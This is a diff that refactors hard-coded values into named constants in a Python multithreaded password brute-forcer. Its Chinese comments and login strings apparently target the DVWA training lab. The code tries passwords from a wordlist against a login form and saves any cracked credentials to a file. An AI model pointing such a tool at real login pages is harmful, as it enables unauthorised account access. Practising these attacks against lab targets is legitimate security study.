@@ -10,6 +10,13 @@ import os
 SUCCESS_FLAG = "Welcome to the password protected area"
 FAIL_FLAG = "Username and/or password incorrect"
 
+# 配置常量
+REQUEST_TIMEOUT = 5
+THREAD_SLEEP_INTERVAL = 0.05
+LOGIN_BUTTON_NAME = "Login"
+RESULT_FILE = "result.txt"
+DEFAULT_USERNAME_FILE = "username.txt"
+
 class BruteForcer:
     def __init__(self, url, cookie, user, wordlist, threads):
         # 初始化暴力破解类
@@ -62,7 +69,7 @@ class BruteForcer:
             params = {
                 "username": user,
                 "password": pwd,
-                "Login": "Login"
+                LOGIN_BUTTON_NAME: LOGIN_BUTTON_NAME
             }
 
             try:
@@ -70,7 +77,7 @@ class BruteForcer:
                     self.url,
                     params=params,
                     headers=self.headers,
-                    timeout=5
+                    timeout=REQUEST_TIMEOUT
                 )
 
                 if SUCCESS_FLAG in r.text:
@@ -81,7 +88,7 @@ class BruteForcer:
                     print("password:", pwd)
 
                     # 将破解的用户名和密码存入result.txt
-                    with open("result.txt", "w") as f:
+                    with open(RESULT_FILE, "w") as f:
                         f.write("username:" + user + "\n" + "password:" + pwd)
 
                     self.q.task_done()
@@ -92,7 +99,7 @@ class BruteForcer:
                 pass
 
             self.q.task_done()
-            time.sleep(0.05)
+            time.sleep(THREAD_SLEEP_INTERVAL)
 
     def run(self):
         self.load_tasks()
@@ -136,9 +143,9 @@ def main():
             final_user = args.username
     else:
         # 如果没传入用户名参数，使用默认的username.txt进行爆破
-        if os.path.isfile("username.txt"):
+        if os.path.isfile(DEFAULT_USERNAME_FILE):
             try:
-                with open("username.txt", "r") as f:
+                with open(DEFAULT_USERNAME_FILE, "r") as f:
                     final_user = [line.strip() for line in f if line.strip()]
                 print("未指定用户名，已加载默认username.txt")
             except:
